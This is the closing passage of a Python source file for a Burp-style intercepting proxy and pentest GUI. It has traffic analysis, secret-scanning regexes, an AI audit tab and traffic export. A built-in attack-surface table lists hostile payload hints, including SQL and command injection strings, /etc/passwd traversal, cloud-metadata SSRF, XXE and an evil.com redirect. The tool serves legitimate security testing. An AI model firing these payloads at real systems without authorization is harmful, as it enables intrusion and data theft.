        except Exception:
            pass

    def _toggle_theme(self):
        """Toggle between dark and light theme."""
        global T, CSS, _DARK_MODE
        _DARK_MODE = not _DARK_MODE
        T = _ThemeDark() if _DARK_MODE else _ThemeLight()
        CSS = _make_css()
        QApplication.instance().setStyleSheet(CSS)
        self.theme_btn.setText("Light" if _DARK_MODE else "Dark")
        self._log(f"Theme: {'dark' if _DARK_MODE else 'light'}")

    def _load_settings(self):
        """Load persisted settings (port, theme, etc.)."""
        pass  # Settings loaded via QSettings on demand

    def _save_settings(self):
        """Persist settings before quit."""
        pass

    def _analysis_tab(self):
        """Attack Surface Mapper + Traffic Intel — beyond Burp Pro."""
        import re as _re, collections, urllib.parse as _up
        w = QWidget()
        root = QVBoxLayout(w); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # ── control bar ──────────────────────────────────────────────────────
        ctl = QWidget(); ctl.setFixedHeight(42)
        ctl.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        cl = QHBoxLayout(ctl); cl.setContentsMargins(10,0,10,0); cl.setSpacing(8)
        self.an_target = QLineEdit()
        self.an_target.setPlaceholderText(
            "https://target.com  or leave blank to analyse captured traffic")
        self.an_target.setFixedHeight(28)
        an_run = self._btn("  Analyse", "primary", h=28)
        an_clr = self._btn("Clear", h=28)
        an_exp = self._btn("Export Report", h=28)
        self.an_prog = QProgressBar(); self.an_prog.setFixedHeight(5)
        self.an_prog.setTextVisible(False); self.an_prog.setValue(0)
        self.an_status = QLabel("Ready — run an analysis or browse through the proxy first")
        self.an_status.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        cl.addWidget(QLabel("Target:")); cl.addWidget(self.an_target, 1)
        cl.addWidget(an_run); cl.addWidget(an_clr); cl.addWidget(an_exp)
        cl.addSpacing(12); cl.addWidget(self.an_status)
        root.addWidget(ctl)
        root.addWidget(self.an_prog)

        # ── result tabs ───────────────────────────────────────────────────────
        tabs = QTabWidget()
        tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:6px 18px;font-size:12px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")
        root.addWidget(tabs, 1)

        def _tree(cols):
            t = QTreeWidget(); t.setHeaderLabels(cols)
            t.setAlternatingRowColors(True); t.setRootIsDecorated(False)
            t.header().setStretchLastSection(True)
            t.setStyleSheet(
                f"QTreeWidget{{background:{T.PANEL};border:none;alternate-background-color:{T.SURFACE};}}"
                f"QTreeWidget::item{{padding:4px 8px;}}")
            return t

        def _rtext():
            e = QPlainTextEdit(); e.setReadOnly(True); e.setFont(mono_font(10))
            e.setStyleSheet(
                f"background:{T.BG};color:{T.CODE};border:none;padding:10px;font-family:{T.MONO};")
            return e

        self.an_tech    = _tree(["Technology","Version","Evidence","Category"])
        self.an_ep      = _tree(["Method","Endpoint","Status","Auth Required","Content-Type","Notes"])
        self.an_params  = _tree(["Parameter","Location","Type","Example","Endpoint"])
        self.an_secrets = _tree(["Type","Value (masked)","Found In","Risk"])
        self.an_auth    = _tree(["Mechanism","Detail","Endpoint","Strength","Issues"])
        self.an_attack  = _tree(["Priority","Test Case","Target","Payload Hint","CWE"])
        self.an_report  = _rtext()

        tabs.addTab(self.an_tech,    "Tech Stack")
        tabs.addTab(self.an_ep,      "Endpoints")
        tabs.addTab(self.an_params,  "Parameters")
        tabs.addTab(self.an_secrets, "Secrets")
        tabs.addTab(self.an_auth,    "Auth")
        tabs.addTab(self.an_attack,  "Attack Surface")
        tabs.addTab(self.an_report,  "Report")

        # ── analysis engine ───────────────────────────────────────────────────
        TECH_SIGS = [
            ('Server','Apache',r'Apache(?:/[\d.]+)?','Web Server'),
            ('Server','Nginx',r'nginx(?:/[\d.]+)?','Web Server'),
            ('Server','IIS',r'Microsoft-IIS(?:/[\d.]+)?','Web Server'),
            ('X-Powered-By','PHP',r'PHP(?:/[\d.]+)?','Language'),
            ('X-Powered-By','ASP.NET',r'ASP\.NET','Language'),
            ('X-Generator','WordPress',r'WordPress(?:/[\d.]+)?','CMS'),
            ('Set-Cookie','PHP',r'PHPSESSID','Language'),
            ('Set-Cookie','Java',r'JSESSIONID','Language'),
            ('Set-Cookie','ASP.NET',r'ASP\.NET_SessionId','Language'),
            ('CF-Ray','Cloudflare',r'.*','CDN'),
            ('X-Vercel-Id','Vercel',r'.*','Hosting'),
            ('X-Amzn-Trace-Id','AWS','.*','Cloud'),
        ]
        SECRET_PATS = [
            ('API Key',      r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?'),
            ('Bearer Token', r'Bearer\s+([A-Za-z0-9\-._~+/]+=*)'),
            ('AWS Key',      r'AKIA[0-9A-Z]{16}'),
            ('Private Key',  r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
            ('Password',     r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s&]{4,})["\']?'),
            ('JWT',          r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'),
            ('Email',        r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'),
            ('GitHub Token', r'ghp_[A-Za-z0-9]{36}'),
            ('Google Key',   r'AIza[0-9A-Za-z\-_]{35}'),
            ('Credit Card',  r'\b4[0-9]{12}(?:[0-9]{3})?\b|\b5[1-5][0-9]{14}\b'),
        ]
        ATTACK_TESTS = [
            ('Critical','SQL Injection','All DB params',"' OR '1'='1",'CWE-89'),
            ('Critical','Command Injection','OS-facing params','`id`;$(whoami)','CWE-78'),
            ('High','XSS Reflected','String inputs','<script>alert(1)</script>','CWE-79'),
            ('High','SSTI','Template endpoints','{{7*7}} ${7*7}','CWE-94'),
            ('High','Path Traversal','File/path params','../../../etc/passwd','CWE-22'),
            ('High','SSRF','URL/host params','http://169.254.169.254/','CWE-918'),
            ('High','IDOR','ID/UUID params','Fuzz ±1, UUID enum','CWE-639'),
            ('Medium','XXE','XML bodies','<!ENTITY xxe SYSTEM "file:///etc/passwd">','CWE-611'),
            ('Medium','CSRF','State-change POSTs','Replay without token','CWE-352'),
            ('Medium','Open Redirect','redirect/url/next params','//evil.com','CWE-601'),
            ('Medium','JWT alg:none','JWT endpoints','Alg=none, strip sig','CWE-347'),
            ('Low','Clickjacking','Pages missing X-Frame','iframe embed','CWE-1021'),
            ('Low','Info Disclosure','Error pages','Malformed input','CWE-209'),
        ]

        def _run():
            url_filter = self.an_target.text().strip()
            msgs = [m for m in self.db.recent
                    if not url_filter or
                       url_filter.replace('https://','').replace('http://','').split('/')[0]
                       in m.get('url','')]
            if not msgs and not url_filter:
                self.an_status.setText("No traffic captured. Browse via proxy first.")
                return
            for t2 in [self.an_tech,self.an_ep,self.an_params,
                       self.an_secrets,self.an_auth,self.an_attack]:
                t2.clear()
            self.an_report.clear()
            self.an_prog.setValue(10); self.an_status.setText("Analysing…")
            QApplication.processEvents()

            def _worker():
                r = {'tech':[],'eps':[],'params':[],'secrets':[],'auth':[],'attack':[]}
                seen_tech=set(); seen_ep=set(); seen_par=set(); seen_sec=set()
                for m in msgs:
                    url2 = m.get('url',''); meth = m.get('method','GET')
                    rh = m.get('req_headers') or {}; rsh = m.get('resp_headers') or {}
                    rb = decode_body(m.get('req_body')) or ''
                    rsb = decode_body(m.get('resp_body')) or ''
                    stat = m.get('status',0); ct = rsh.get('Content-Type',rsh.get('content-type',''))
                    parsed = _up.urlparse(url2)
                    ep_key = f"{meth}:{parsed.path}"
                    # Tech
                    for hdr,name,pat,cat in TECH_SIGS:
                        val = rsh.get(hdr,rh.get(hdr,''))
                        if not val: continue
                        mo = _re.search(pat,val,_re.I)
                        if mo and name not in seen_tech:
                            seen_tech.add(name)
                            r['tech'].append([name, mo.group(0)[:30], f"{hdr}: {val[:50]}", cat])
                    # Endpoints
                    if ep_key not in seen_ep:
                        seen_ep.add(ep_key)
                        auth_req = 'Yes' if any(k.lower() in ('authorization','x-api-key','x-auth-token') for k in rh) else 'No'
                        notes = []
                        if 'admin' in parsed.path.lower(): notes.append('⚠ admin')
                        if any(x in parsed.path.lower() for x in ['/api/','/v1/','/v2/']): notes.append('API')
                        if parsed.query: notes.append('has params')
                        r['eps'].append([meth, parsed.path[:80], str(stat), auth_req, ct[:30], ', '.join(notes)])
                    # Params
                    for k,v in _up.parse_qsl(parsed.query):
                        pk=f"q:{k}"
                        if pk not in seen_par:
                            seen_par.add(pk)
                            r['params'].append([k,'Query','integer' if v.isdigit() else 'string',v[:25],parsed.path[:35]])
                    if rb and 'json' in rh.get('Content-Type',rh.get('content-type','')).lower():
                        try:
                            for k,v in (json.loads(rb).items() if isinstance(json.loads(rb),dict) else []):
                                pk=f"j:{k}"
                                if pk not in seen_par:
                                    seen_par.add(pk)
                                    r['params'].append([k,'JSON Body',type(v).__name__,str(v)[:25],parsed.path[:35]])
                        except Exception: pass
                    # Secrets
                    scan_txt = rb+rsb+str(rh)+str(rsh)
                    for stype,pat in SECRET_PATS:
                        for mo in _re.finditer(pat, scan_txt):
                            raw=mo.group(0)
                            sk=f"{stype}:{raw[:20]}"
                            if sk in seen_sec: continue
                            seen_sec.add(sk)
                            masked=raw[:4]+'***'+raw[-4:] if len(raw)>8 else '***'
                            loc='Response' if raw in (rsb+str(rsh)) else 'Request'
                            risk='Critical' if stype in ('Private Key','AWS Key','Credit Card') else 'High' if stype in ('Bearer Token','API Key','GitHub Token','JWT') else 'Medium'
                            r['secrets'].append([stype,masked,loc,risk])
                    # Auth
                    auth_h = rh.get('Authorization',rh.get('authorization',''))
                    if auth_h:
                        if auth_h.startswith('Bearer '):
                            tok=auth_h[7:]
                            is_jwt=tok.count('.')==2 and tok.startswith('eyJ')
                            r['auth'].append(['Bearer Token',auth_h[:40],parsed.path[:40],
                                              'JWT' if is_jwt else 'Opaque',
                                              'Check alg:none' if is_jwt else ''])
                        elif 'basic' in auth_h.lower():
                            r['auth'].append(['Basic Auth','***encoded***',parsed.path[:40],'Weak','Credentials in every request'])
                # Attack surface
                r['attack'] = [[p,t2,tgt,hint,cwe] for p,t2,tgt,hint,cwe in ATTACK_TESTS]
                return r

            def _done(res):
                from PyQt6.QtGui import QColor, QBrush
                self.an_prog.setValue(100)
                self.an_status.setText(
                    f"Done — {len(res['eps'])} endpoints · {len(res['params'])} params · "
                    f"{len(res['secrets'])} secrets · {len(res['auth'])} auth mechanisms")
                mc = {'GET':T.GREEN,'POST':T.YELLOW,'PUT':T.BLUE,'DELETE':T.RED,'PATCH':T.PURPLE}
                rc = {'Critical':T.RED,'High':T.YELLOW,'Medium':T.CYAN,'Low':T.TXT3}
                pc = {'Critical':T.RED,'High':T.YELLOW,'Medium':T.CYAN,'Low':T.TXT3}
                for row in res['tech']: self.an_tech.addTopLevelItem(QTreeWidgetItem(row))
                for row in res['eps']:
                    it=QTreeWidgetItem(row); it.setForeground(0,QBrush(QColor(mc.get(row[0],T.TXT2))))
                    if '⚠' in row[5]: it.setForeground(5,QBrush(QColor(T.YELLOW)))
                    self.an_ep.addTopLevelItem(it)
                for row in res['params']: self.an_params.addTopLevelItem(QTreeWidgetItem(row))
                for row in res['secrets']:
                    it=QTreeWidgetItem(row); it.setForeground(3,QBrush(QColor(rc.get(row[3],T.TXT2))))
                    self.an_secrets.addTopLevelItem(it)
                for row in res['auth']:
                    it=QTreeWidgetItem(row)
                    if row[4]: it.setForeground(4,QBrush(QColor(T.YELLOW)))
                    self.an_auth.addTopLevelItem(it)
                for row in res['attack']:
                    it=QTreeWidgetItem(row); it.setForeground(0,QBrush(QColor(pc.get(row[0],T.TXT2))))
                    self.an_attack.addTopLevelItem(it)
                lines2 = [
                    "╔══════════════════════════════════════════════════╗",
                    "║         Kingception Security Analysis Report       ║",
                    "╚══════════════════════════════════════════════════╝","",
                    f"  Endpoints   : {len(res['eps'])}",
                    f"  Parameters  : {len(res['params'])}",
                    f"  Secrets     : {len(res['secrets'])}",
                    f"  Auth mechs  : {len(res['auth'])}",
                    f"  Tech stack  : {len(res['tech'])}","",
                    "── TECH STACK ─────────────────────────────────────"]
                for t2 in res['tech']: lines2.append(f"  {t2[3]:<18} {t2[0]} {t2[1]}")
                lines2 += ["","── SECRETS ────────────────────────────────────────"]
                for s in res['secrets']: lines2.append(f"  [{s[3]:<8}] {s[0]:<18} {s[1]}  ({s[2]})")
                lines2 += ["","── ATTACK SURFACE ─────────────────────────────────"]
                for a in res['attack']: lines2.append(f"  [{a[0]:<8}] {a[1]:<22} → {a[4]}")
                self.an_report.setPlainText('\n'.join(lines2))
                self._log(f"[Analysis] {len(res['eps'])} endpoints, {len(res['secrets'])} secrets")

            fut = self._thread_pool.submit(_worker)
            def _poll():
                if fut.done():
                    try: _done(fut.result())
                    except Exception as ex:
                        self.an_status.setText(f"Error: {ex}"); self.an_prog.setValue(0)
                else:
                    self.an_prog.setValue(min(self.an_prog.value()+2, 92))
                    QTimer.singleShot(200, _poll)
            QTimer.singleShot(200, _poll)

        def _export():
            path, _ = QFileDialog.getSaveFileName(
                self,"Export Report","kingception_analysis.txt","Text (*.txt);;All (*.*)")
            if path:
                with open(path,'w',encoding='utf-8') as f:
                    f.write(self.an_report.toPlainText())
                self._log(f"Report exported: {path}")

        an_run.clicked.connect(_run)
        an_clr.clicked.connect(lambda: [
            t3.clear() for t3 in [self.an_tech,self.an_ep,self.an_params,
                                   self.an_secrets,self.an_auth,self.an_attack]
        ] or self.an_report.clear() or self.an_status.setText("Cleared")
                               or self.an_prog.setValue(0))
        an_exp.clicked.connect(_export)
        return w

    def _ai_analyzer_tab(self):
        """AI-powered security analysis using Claude API."""
        w = QWidget()
        v = QVBoxLayout(w); v.setContentsMargins(8,8,8,8); v.setSpacing(6)

        info = QLabel(
            "AI-powered vulnerability analysis — paste an HTTP request/response "
            "and get an instant security audit with CVEs, CVSS scores, and remediation advice.")
        info.setWordWrap(True)
        info.setStyleSheet(
            f"color:{T.TXT1};font-size:12px;background:{T.SURFACE};"
            f"padding:10px;border-radius:8px;")
        v.addWidget(info)

        sp = QSplitter(Qt.Orientation.Horizontal); sp.setHandleWidth(2)

        # Input panel
        inp = QWidget(); iv = QVBoxLayout(inp); iv.setContentsMargins(0,0,0,0)
        iv.addWidget(QLabel("HTTP Request / Response to analyse:"))
        self.ai_input = QPlainTextEdit()
        self.ai_input.setFont(mono_font(10))
        self.ai_input.setPlaceholderText(
            "Paste the HTTP request and/or response here…\n\n"
            "Example:\nPOST /login HTTP/1.1\nHost: target.com\n"
            "Content-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"x\"}")
        iv.addWidget(self.ai_input, 1)

        ai_mode = QComboBox()
        ai_mode.addItems([
            "Full Security Audit",
            "OWASP Top 10 Check",
            "Auth & Session Analysis",
            "Input Validation / Injection",
            "Business Logic Review",
            "API Security Review",
            "CVE / Tech Fingerprint",
            "Remediation Code Only",
            "Custom Prompt…",
        ])
        iv.addWidget(ai_mode)
        sp.addWidget(inp)

        # Output panel
        out = QWidget(); ov = QVBoxLayout(out); ov.setContentsMargins(0,0,0,0)
        ov.addWidget(QLabel("AI Analysis:"))
        self.ai_output = QPlainTextEdit(); self.ai_output.setReadOnly(True)
        self.ai_output.setFont(mono_font(10))
        self.ai_output.setPlaceholderText("Analysis results will appear here…")
        ov.addWidget(self.ai_output, 1)
        sp.addWidget(out); sp.setSizes([500,500])
        v.addWidget(sp, 1)

        bb = QHBoxLayout()
        self.ai_run_btn  = self._btn("  Analyse", "primary", h=30)
        ai_clear_btn     = self._btn("Clear", "danger", h=30)
        ai_copy_btn      = self._btn("Copy Result", h=30)
        self.ai_status_l = QLabel("")
        self.ai_status_l.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        bb.addWidget(self.ai_run_btn); bb.addWidget(ai_clear_btn)
        bb.addWidget(ai_copy_btn); bb.addStretch(); bb.addWidget(self.ai_status_l)
        v.addLayout(bb)

        PROMPTS = {
            "Full Security Audit": (
                "You are a senior penetration tester. Perform a comprehensive security audit "
                "of the following HTTP traffic. Identify ALL vulnerabilities with:\n"
                "- Vulnerability name and category\n"
                "- Severity (Critical/High/Medium/Low)\n"
                "- CVSS v3.1 score and CWE ID\n"
                "- Exact evidence from the request/response\n"
                "- Step-by-step reproduction\n"
                "- Remediation with code examples\n\n"
                "HTTP Traffic:\n"),
            "OWASP Top 10 Check": (
                "Analyse this HTTP traffic against OWASP Top 10 2021 (A01-A10). "
                "For each category state Vulnerable/Safe/Unclear with evidence.\n\nHTTP Traffic:\n"),
            "Auth & Session Analysis": (
                "Analyse authentication and session management. Check for: weak tokens, "
                "missing HttpOnly/Secure flags, session fixation, CSRF, improper logout, "
                "JWT weaknesses, OAuth flaws.\n\nHTTP Traffic:\n"),
            "Input Validation / Injection": (
                "Check all input vectors for: SQLi, XSS, SSTI, XXE, SSRF, command injection, "
                "path traversal, deserialization. Provide PoC payloads for any findings.\n\nHTTP Traffic:\n"),
            "Business Logic Review": (
                "Review for business logic vulnerabilities: price manipulation, IDOR, "
                "privilege escalation, workflow bypass, race conditions.\n\nHTTP Traffic:\n"),
            "API Security Review": (
                "Review against OWASP API Security Top 10. Check authentication, "
                "authorisation, data exposure, rate limiting, injection.\n\nHTTP Traffic:\n"),
            "CVE / Tech Fingerprint": (
                "Identify the technology stack. List known CVEs with CVSS scores, "
                "descriptions, exploit availability, and patches.\n\nHTTP Traffic:\n"),
            "Remediation Code Only": (
                "Provide specific, actionable remediation code for security issues visible "
                "in this HTTP traffic. Focus on fixes only.\n\nHTTP Traffic:\n"),
        }

        def _run():
            text = self.ai_input.toPlainText().strip()
            if not text:
                self.ai_output.setPlainText("⚠ Paste some HTTP traffic above first.")
                return
            mode = ai_mode.currentText()
            if mode == "Custom Prompt…":
                custom, ok = QInputDialog.getMultiLineText(
                    w, "Custom Prompt", "Enter your analysis prompt:", "Analyse this HTTP traffic:\n")
                if not ok or not custom.strip(): return
                prompt = custom + "\n\nHTTP Traffic:\n" + text
            else:
                prompt = PROMPTS.get(mode, PROMPTS["Full Security Audit"]) + text

            self.ai_run_btn.setEnabled(False)
            self.ai_status_l.setText("⏳ Sending to AI…")
            self.ai_output.setPlainText("Analysing… please wait.")

            def _worker():
                try:
                    import urllib.request as _ur, json as _j
                    req = _ur.Request(
                        "https://api.anthropic.com/v1/messages",
                        data=_j.dumps({
                            "model": "claude-sonnet-4-20250514",
                            "max_tokens": 4096,
                            "messages": [{"role": "user", "content": prompt}]
                        }).encode(),
                        headers={
                            "content-type": "application/json",
                            "anthropic-version": "2023-06-01",
                        })
                    resp = _ur.urlopen(req, timeout=60)
                    result = _j.loads(resp.read())
                    return result['content'][0]['text']
                except Exception as ex:
                    return f"❌ API Error: {ex}\n\nMake sure you have network access."

            fut = self._thread_pool.submit(_worker)
            def _poll():
                if fut.done():
                    self.ai_run_btn.setEnabled(True)
                    result = fut.result()
                    self.ai_output.setPlainText(result)
                    self.ai_status_l.setText("✅ Done")
                    self._log(f"[AI] Analysis complete ({len(result)} chars)")
                else:
                    QTimer.singleShot(200, _poll)
            QTimer.singleShot(200, _poll)

        self.ai_run_btn.clicked.connect(_run)
        ai_clear_btn.clicked.connect(lambda: (
            self.ai_input.clear(), self.ai_output.clear(), self.ai_status_l.setText("")))
        ai_copy_btn.clicked.connect(
            lambda: QApplication.clipboard().setText(self.ai_output.toPlainText()))
        return w

    def _export_json(self):
        """Export captured traffic to JSON."""
        path, _ = QFileDialog.getSaveFileName(
            self, "Export JSON", "kingception_traffic.json", "JSON (*.json);;All (*.*)")
        if not path:
            return
        msgs = [
            {
                "id": m.get("id",""),
                "ts": m.get("ts", 0),
                "method": m.get("method",""),
                "url": m.get("url",""),
                "host": m.get("host",""),
                "path": m.get("path",""),
                "scheme": m.get("scheme",""),
                "status": m.get("status", 0),
                "duration": round(m.get("dur", 0), 4),
                "resp_size": m.get("resp_size", 0),
                "content_type": m.get("content_type",""),
                "req_headers": m.get("req_headers") or {},
                "req_body": decode_body(m.get("req_body")),
                "resp_headers": m.get("resp_headers") or {},
                "resp_body": decode_body(m.get("resp_body")),
            }
            for m in self.db.recent
        ]
        with open(path, "w", encoding="utf-8") as f:
            json.dump(msgs, f, indent=2, ensure_ascii=False, default=str)
        self._log(f"Exported {len(msgs)} requests → {path}")

    def _export_csv(self):
        """Export captured traffic to CSV."""
        import csv as _csv
        path, _ = QFileDialog.getSaveFileName(
            self, "Export CSV", "kingception_traffic.csv", "CSV (*.csv);;All (*.*)")
        if not path:
            return
        msgs = list(self.db.recent)
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = _csv.writer(f)
            w.writerow(["#","Method","Host","Path","Status","Size (B)",
                        "Duration (s)","Content-Type","URL"])
            for i, m in enumerate(msgs, 1):
                w.writerow([
                    i,
                    m.get("method",""),
                    m.get("host",""),
                    m.get("path",""),
                    m.get("status",""),
                    m.get("resp_size", 0),
                    round(m.get("dur", 0), 3),
                    m.get("content_type",""),
                    m.get("url",""),
                ])
        self._log(f"Exported {len(msgs)} rows → {path}")

    def _export_curl(self):
        """Export captured requests as cURL commands."""
        path, _ = QFileDialog.getSaveFileName(
            self, "Export cURL", "kingception_curl.sh", "Shell (*.sh);;Text (*.txt);;All (*.*)")
        if not path:
            return
        lines = ["#!/usr/bin/env bash", "# Kingception cURL export", ""]
        for m in self.db.recent:
            url     = m.get("url","")
            method  = m.get("method","GET")
            headers = m.get("req_headers") or {}
            body    = decode_body(m.get("req_body"))
            cmd     = f"curl -X {method} '{url}'"
            for k, v in headers.items():
                if k.lower() in ("host","content-length","transfer-encoding"):
                    continue
                cmd += f" \\\n     -H '{k}: {v}'"
            if body:
                safe_body = body.replace("'", "'\\''")
                cmd += f" \\\n     -d '{safe_body}'"
            cmd += " \\\n     --insecure"
            lines.append(cmd)
            lines.append("")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        self._log(f"Exported {len(self.db.recent)} cURL commands → {path}")

    def _import_json(self):
        """Import a previously exported JSON traffic dump."""
        path, _ = QFileDialog.getOpenFileName(
            self, "Import JSON", "", "JSON (*.json);;All (*.*)")
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                msgs = json.load(f)
            if not isinstance(msgs, list):
                raise ValueError("Expected a JSON array of messages")
            imported = 0
            for m in msgs:
                if not isinstance(m, dict) or "url" not in m:
                    continue
                self.db.recent.append(m)
                # Add to traffic tree
                from PyQt6.QtGui import QColor, QBrush
                n = self.proxy_tree.topLevelItemCount() + 1
                item = QTreeWidgetItem()
                item.setText(0, str(n))
                item.setText(1, m.get("method",""))
                item.setText(2, m.get("host",""))
                item.setText(3, m.get("path", m.get("url",""))[:120])
                item.setText(4, str(m.get("status","")))
                item.setText(5, pretty_size(m.get("resp_size",0)))
                item.setText(6, f"{m.get('duration',0):.2f}s")
                item.setText(7, m.get("content_type","")[:40])
                item.setForeground(1, QBrush(QColor(method_color(m.get("method","")))))
                item.setForeground(4, QBrush(QColor(status_color(m.get("status",0)))))
                item.setData(0, Qt.ItemDataRole.UserRole, m.get("id",""))
                self.proxy_tree.addTopLevelItem(item)
                imported += 1
            if hasattr(self, "_traffic_count_lbl"):
                self._traffic_count_lbl.setText(
                    f"{self.proxy_tree.topLevelItemCount()} requests")
            self._log(f"Imported {imported} requests from {path}")
            QMessageBox.information(self, "Import Complete",
                                    f"Imported {imported} requests.")
        except Exception as ex:
            QMessageBox.critical(self, "Import Failed", str(ex))
            self._log(f"Import error: {ex}")

    def closeEvent(self, e):
        self._save_settings()
        if self.proxy.is_running:
            self.proxy.stop()
        e.accept()
# ========== MAIN ==========
def main():
    print("\n" + "═" * 70)
    print("  ⚡  Kingception v1.0  —  Burp‑style Security Suite  [Dark Edition]")
    print("═" * 70)
    missing = []
    if not HAS_REQUESTS:
        missing.append("requests")
    if not HAS_CRYPTO:
        missing.append("cryptography")
    if not HAS_JWT:
        missing.append("pyjwt")
    if missing:
        print(f"\n  Install missing packages:")
        print(f"    pip install {' '.join(missing)}")
        if not HAS_CRYPTO:
            print("  ⚠ Without cryptography: HTTPS MITM not available (tunneling only)")
    print("\n  Starting GUI – proxy auto‑started on 127.0.0.1:8080\n")
    app = QApplication(sys.argv)
    app.setApplicationName("Kingception v1.0")
    app.setStyle("Fusion")
    app.setStyleSheet(CSS)
    w = MainWindow()
    w.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()